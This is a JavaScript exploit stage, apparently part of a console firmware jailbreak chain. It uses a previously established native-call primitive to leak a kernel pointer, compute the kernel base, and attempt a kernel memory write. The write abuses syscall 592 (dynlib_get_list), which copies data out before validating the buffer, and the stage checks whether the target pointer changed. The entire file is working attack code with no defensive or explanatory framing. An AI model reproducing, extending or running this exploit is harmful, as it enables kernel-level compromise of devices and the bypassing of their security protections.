// KERNEL WRITE VIA 592 COPYOUT-BEFORE-VALIDATE QUIRK.
// We proved 592 (dynlib_get_list) copies 108 bytes to the caller's
// buffer BEFORE validating the size (EFAULT at 0x400 but data present).
// If we pass a KERNEL address as the buffer, the copyout should write
// 108 bytes of module handle data to kernel memory, then return
// EFAULT. Target: kbase+0x3AC30DF0 (the 638 pointer — known mapped).
// After the write, 638 should return a MODIFIED pointer (first 4 bytes
// overwritten with the first module handle). call64 for the 64-bit
// address. Markers 5 of 8.
var result;
var phase = "preflight";
try {
  var state = window.__fw14ArrayState;
  var plan = window.__fw14NativePlan;
  var native = window.__fw14NativeInvoke;
  if (!state || !plan || !native || typeof native.call !== "function" ||
      typeof native.call64 !== "function" ||
      !native.frame || !Number.isSafeInteger(native.frameAddress) ||
      typeof native.wrappers.sys638 !== "number" ||
      typeof native.wrappers.dynlib_list !== "number")
    throw new Error("chain_or_call64_missing");
  var frame = native.frame;
  function mark(phaseName) {
    try {
      if (api && typeof api.markSync === "function")
        api.markSync(phaseName);
    } catch (markerError) {}
  }
  var before = native.call("getpid", []);
  if (before.high !== 0 || before.value < 1 || before.value > 100000)
    throw new Error("session_pid_changed");
  mark("kw92_preflight");

  // Derive kbase
  phase = "derive_kbase";
  var out2Off = 0x1e00, out3Off = 0x1e10;
  var out2Addr = native.frameAddress + out2Off;
  var out3Addr = native.frameAddress + out3Off;
  var fv = new DataView(frame.buffer);
  var o2orig = Array.from(frame.subarray(out2Off, out2Off + 32));
  var o3orig = Array.from(frame.subarray(out3Off, out3Off + 16));
  native.call("sys638", [0, out2Addr, out3Addr]);
  var klo = fv.getUint32(out2Off, true);
  var khi = fv.getUint32(out2Off + 4, true);
  var blo = (klo - 0x3B1AABA0) >>> 0;
  var bhi = khi;
  if (klo < 0x3B1AABA0) { blo = (klo - 0x3B1AABA0) >>> 0;
    bhi = (khi - 1) >>> 0; }
  var DOFF = 0x3AC30DF0;
  var tlo = (blo + DOFF) >>> 0;
  var thi = (bhi + ((blo + DOFF) > 0xffffffff ? 1 : 0)) >>> 0;
  mark("kw92_kbase_ok");

  // Baseline 638 arg3
  phase = "baseline";
  native.call("sys638", [0, out2Addr, out3Addr]);
  var base_lo = fv.getUint32(out3Off, true);
  var base_hi = fv.getUint32(out3Off + 4, true);
  mark("kw92_base:" + base_lo.toString(16) + "_" + base_hi.toString(16));

  // THE KERNEL WRITE: 592 with kernel address as buffer
  phase = "kernel_write_592";
  var result592 = native.call64("dynlib_list",
    [[tlo, thi], [0x1000, 0]]);
  var errno592 = (result592.value === -1) ?
    native.readErrno() : null;
  mark("kw92_write_ret:" + result592.value + "/" +
    (errno592 === null ? "ok" : errno592));

  // Read 638 arg3 after the write
  phase = "post_read";
  native.call("sys638", [0, out2Addr, out3Addr]);
  var post_lo = fv.getUint32(out3Off, true);
  var post_hi = fv.getUint32(out3Off + 4, true);
  var changed = (post_lo !== base_lo) || (post_hi !== base_hi);
  mark("kw92_post:" + post_lo.toString(16) + "_" +
    post_hi.toString(16) + (changed ? " CHANGED" : " same"));

  // Restore 638 out buffers
  for (var r = 0; r < 16; r++) frame[out3Off + r] = o3orig[r];
  for (var r2 = 0; r2 < 32; r2++) frame[out2Off + r2] = o2orig[r2];
  var after = native.call("getpid", []);
  mark("kw92_done");

  result = { id: "kernel_write_592_v1",
    status: (after.value === before.value && after.high === 0) ?
      "pass" : "fail",
    details: { target: thi.toString(16) + "_" + tlo.toString(16),
      baseline: base_lo.toString(16) + "_" + base_hi.toString(16),
      post: post_lo.toString(16) + "_" + post_hi.toString(16),
      changed: changed ? 1 : 0,
      r592: result592.value,
      e592: errno592 === null ? "ok" : errno592,
      pid_ok: after.value === before.value && after.high === 0 } };
} catch (error) {
  result = { id: "kernel_write_592_v1", status: "error",
    details: { phase: phase, error: String(error).slice(0, 180) } };
}
return [result];
